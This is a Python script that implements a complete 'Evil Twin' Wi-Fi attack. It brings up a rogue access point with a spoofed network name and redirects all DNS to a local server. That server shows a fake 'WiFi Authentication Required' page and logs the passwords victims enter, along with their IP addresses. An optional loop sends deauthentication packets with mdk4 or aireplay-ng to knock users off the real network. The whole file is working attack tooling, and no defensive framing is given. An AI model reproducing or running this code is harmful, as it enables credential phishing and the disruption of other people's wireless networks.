#!/usr/bin/env python3
"""
Evil Twin + Captive Portal
wlan1 = AP (broadcasts fake network)
wlan0 = deauth (optional, disconnects internet)
"""

import os, re, sys, time, signal, subprocess, threading, shutil
from pathlib import Path
from datetime import datetime

PORTAL_DIR = Path("/tmp/evil_twin")


class EvilTwin:
    def __init__(self, ap_iface, essid, channel=6, deauth_iface=None, target_bssid=None):
        self.ap_iface = ap_iface
        self.essid = essid
        self.channel = channel
        self.deauth_iface = deauth_iface
        self.target_bssid = target_bssid
        self.gateway = "10.0.0.1"
        self.port = 80
        self.running = False
        self.processes = []
        self.captured = []
        self.callback = None
        PORTAL_DIR.mkdir(exist_ok=True)

    def _log(self, msg):
        if self.callback:
            self.callback(msg)

    def start(self):
        self.running = True

        self._log(f"[+] Starting Evil Twin: '{self.essid}'")

        # 1. Create portal HTML
        self._log("[*] Creating captive portal...")
        self._create_portal()

        # 2. Configure wlan1 for AP
        self._log(f"[*] Configuring {self.ap_iface}...")
        self._setup_interface()

        # 3. Start hostapd
        self._log("[*] Starting hostapd...")
        if not self._start_hostapd():
            self._log("[!] hostapd failed")
            return False

        time.sleep(3)

        # 4. Start dnsmasq
        self._log("[*] Starting dnsmasq...")
        self._start_dnsmasq()

        time.sleep(2)

        # 5. Start web server
        self._log("[*] Starting captive portal...")
        self._start_webserver()

        time.sleep(1)

        # 6. Start deauth thread (if iface provided)
        if self.deauth_iface:
            self._log(f"[*] Starting deauth on {self.deauth_iface}...")
            threading.Thread(target=self._deauth_loop, daemon=True).start()

        # 7. Monitor for captured creds
        threading.Thread(target=self._monitor_creds, daemon=True).start()

        self._log("")
        self._log("=" * 50)
        self._log(f"  EVIL TWIN ACTIVE!")
        self._log(f"  SSID:     {self.essid}")
        self._log(f"  Channel:  {self.channel}")
        self._log(f"  AP Iface: {self.ap_iface}")
        self._log(f"  Portal:   http://{self.gateway}:{self.port}")
        self._log(f"  Waiting for victims...")
        self._log("=" * 50)

        return True

    def stop(self):
        self.running = False

        # Kill all processes
        for name, proc in self.processes:
            try:
                proc.terminate()
                proc.wait(timeout=3)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass

        # Also kill by name
        for prog in ["hostapd", "dnsmasq"]:
            try:
                subprocess.run(["killall", prog], capture_output=True, timeout=5)
            except Exception:
                pass

        # Cleanup IP
        try:
            subprocess.run(
                ["ip", "addr", "del", f"{self.gateway}/24", "dev", self.ap_iface],
                capture_output=True, timeout=5
            )
        except Exception:
            pass

        self.processes = []
        self._log("[+] Evil Twin stopped")

    def _setup_interface(self):
        """Setup wlan1 as AP"""
        cmds = [
            ["ip", "link", "set", self.ap_iface, "down"],
            ["ip", "addr", "flush", "dev", self.ap_iface],
            ["ip", "addr", "add", f"{self.gateway}/24", "dev", self.ap_iface],
            ["ip", "link", "set", self.ap_iface, "up"],
        ]
        for cmd in cmds:
            try:
                subprocess.run(cmd, capture_output=True, timeout=5)
            except Exception:
                pass

    def _create_portal(self):
        """Create captive portal HTML files"""
        login_html = f"""<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WiFi Login</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:Arial,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;justify-content:center;align-items:center}}
.box{{background:#fff;padding:40px;border-radius:15px;box-shadow:0 20px 60px rgba(0,0,0,.3);max-width:400px;width:90%}}
h1{{color:#333;text-align:center;font-size:22px;margin-bottom:10px}}
p{{color:#666;text-align:center;font-size:14px;margin-bottom:20px}}
.net{{color:#667eea;font-weight:bold}}
label{{display:block;color:#555;margin-bottom:5px;font-size:14px}}
input{{width:100%;padding:12px;border:2px solid #ddd;border-radius:8px;font-size:16px;margin-bottom:15px}}
input:focus{{outline:none;border-color:#667eea}}
.btn{{width:100%;padding:14px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer}}
.btn:hover{{opacity:.9}}
.info{{color:#888;font-size:11px;text-align:center;margin-top:15px}}
</style></head><body>
<div class="box">
<h1>WiFi Authentication Required</h1>
<p>Network: <span class="net">{self.essid}</span></p>
<p>Please enter the WiFi password to continue browsing.</p>
<form method="POST" action="/login">
<label>WiFi Password</label>
<input type="password" name="password" placeholder="Enter WiFi password" minlength="8" required autofocus>
<button type="submit" class="btn">Connect</button>
</form>
<p class="info">Your connection will be restored automatically.</p>
</div></body></html>"""

        success_html = """<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<title>Connected</title>
<style>
body{font-family:Arial;background:linear-gradient(135deg,#00b09b,#96c93d);min-height:100vh;display:flex;justify-content:center;align-items:center;color:#fff;text-align:center}
h1{font-size:28px}p{font-size:16px;opacity:.8}
</style></head><body>
<div><h1>Connected!</h1><p>You are now connected to the internet.</p></div>
</body></html>"""

        with open(PORTAL_DIR / "login.html", "w") as f:
            f.write(login_html)
        with open(PORTAL_DIR / "success.html", "w") as f:
            f.write(success_html)

        # Create web server script
        server_code = f'''#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
from datetime import datetime
import os

PORTAL = "{PORTAL_DIR}"
CRED_FILE = os.path.join(PORTAL, "captured.txt")

class H(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_GET(self):
        p = self.path.split("?")[0].strip("/")
        if p in ("generate_204","gen_204","hotspot-detect.html","redirect","connecttest.txt","ncsi.txt","success.txt","success.html"):
            if "success" in p:
                self.send_response(200)
                self.send_header("Content-Type","text/html")
                self.end_headers()
                with open(os.path.join(PORTAL,"success.html"),"rb") as f: self.wfile.write(f.read())
            else:
                self.send_response(302)
                self.send_header("Location","/login.html")
                self.end_headers()
        elif p == "login.html":
            self.send_response(200)
            self.send_header("Content-Type","text/html; charset=utf-8")
            self.end_headers()
            with open(os.path.join(PORTAL,"login.html"),"rb") as f: self.wfile.write(f.read())
        else:
            self.send_response(302)
            self.send_header("Location","/login.html")
            self.end_headers()
    def do_POST(self):
        if "/login" in self.path:
            cl = int(self.headers.get("Content-Length",0))
            body = self.rfile.read(cl).decode("utf-8","ignore")
            pw = parse_qs(body).get("password",[""])[0]
            if pw and len(pw) >= 8:
                ip = self.client_address[0]
                ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                with open(CRED_FILE,"a") as f: f.write(f"{{ts}} | IP:{{ip}} | Password:{{pw}}\\n")
                print(f"[+] CAPTURED: {{pw}} from {{ip}}", flush=True)
                self.send_response(302)
                self.send_header("Location","/success.html")
                self.end_headers()
                return
        self.send_response(302)
        self.send_header("Location","/login.html")
        self.end_headers()

HTTPServer(("0.0.0.0", {self.port}), H).serve_forever()
'''
        with open(PORTAL_DIR / "server.py", "w") as f:
            f.write(server_code)

    def _start_hostapd(self):
        """Start hostapd"""
        conf = f"""interface={self.ap_iface}
driver=nl80211
ssid={self.essid}
hw_mode=g
channel={self.channel}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
        conf_file = PORTAL_DIR / "hostapd.conf"
        with open(conf_file, "w") as f:
            f.write(conf)

        try:
            proc = subprocess.Popen(
                ["hostapd", str(conf_file)],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1
            )
            self.processes.append(("hostapd", proc))
            time.sleep(2)

            # Check if hostapd is running
            if proc.poll() is not None:
                out = proc.stdout.read() if proc.stdout else ""
                self._log(f"[!] hostapd failed: {out[:200]}")
                return False

            self._log(f"[+] hostapd: {self.essid} on CH{self.channel}")
            return True
        except FileNotFoundError:
            self._log("[!] hostapd not found: apt install hostapd")
            return False

    def _start_dnsmasq(self):
        """Start dnsmasq for DHCP + DNS"""
        # Kill existing
        try:
            subprocess.run(["killall", "dnsmasq"], capture_output=True, timeout=5)
        except Exception:
            pass
        time.sleep(1)

        conf = f"""interface={self.ap_iface}
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,{self.gateway}
dhcp-option=6,{self.gateway}
server=8.8.8.8
address=/#/{self.gateway}
no-resolv
no-hosts
cache-size=0
log-queries
log-dhcp
"""
        conf_file = PORTAL_DIR / "dnsmasq.conf"
        with open(conf_file, "w") as f:
            f.write(conf)

        try:
            proc = subprocess.Popen(
                ["dnsmasq", "-C", str(conf_file), "--no-daemon"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1
            )
            self.processes.append(("dnsmasq", proc))
            time.sleep(1)
            self._log("[+] dnsmasq: DHCP + DNS redirect active")
        except FileNotFoundError:
            self._log("[!] dnsmasq not found: apt install dnsmasq")

    def _start_webserver(self):
        """Start captive portal web server"""
        try:
            proc = subprocess.Popen(
                [sys.executable, str(PORTAL_DIR / "server.py")],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1
            )
            self.processes.append(("webserver", proc))
            self._log(f"[+] Captive portal: http://{self.gateway}:{self.port}")
        except Exception as e:
            self._log(f"[!] Web server error: {e}")

    def _deauth_loop(self):
        """Send deauth packets to target network (requires USB WiFi adapter)"""
        if not self.target_bssid:
            self._log("[!] No target BSSID set - deauth disabled")
            return
        if not self.deauth_iface:
            self._log("[!] No deauth interface - deauth disabled")
            return
        self._log("[!] Deauth needs monitor mode - may not work on built-in WiFi (icnss)")
        while self.running:
            try:
                proc = subprocess.Popen(
                    ["mdk4", self.deauth_iface, "d", "-B", self.target_bssid],
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    text=True
                )
                time.sleep(10)
                proc.terminate()
                try:
                    proc.wait(timeout=3)
                except Exception:
                    proc.kill()
                time.sleep(2)
            except FileNotFoundError:
                try:
                    subprocess.run(
                        ["aireplay-ng", "--deauth", "5",
                         "-a", self.target_bssid, self.deauth_iface],
                        capture_output=True, timeout=15
                    )
                except Exception:
                    pass
                time.sleep(5)
            except Exception:
                time.sleep(5)

    def _monitor_creds(self):
        """Monitor captured credentials"""
        cred_file = PORTAL_DIR / "captured.txt"
        last = 0
        while self.running:
            time.sleep(2)
            if cred_file.exists():
                try:
                    with open(cred_file) as f:
                        lines = [l.strip() for l in f if l.strip()]
                    if len(lines) > last:
                        for line in lines[last:]:
                            self._log(f"[+] CREDENTIAL: {line}")
                            self.captured.append(line)
                        last = len(lines)
                except Exception:
                    pass

    def get_captured(self):
        cred_file = PORTAL_DIR / "captured.txt"
        creds = []
        if cred_file.exists():
            try:
                with open(cred_file) as f:
                    creds = [l.strip() for l in f if l.strip()]
            except Exception:
                pass
        return creds


def cleanup_portal():
    """Remove all portal files"""
    if PORTAL_DIR.exists():
        shutil.rmtree(PORTAL_DIR, ignore_errors=True)
    # Kill any leftover processes
    for prog in ["hostapd", "dnsmasq"]:
        try:
            subprocess.run(["killall", prog], capture_output=True, timeout=5)
        except Exception:
            pass
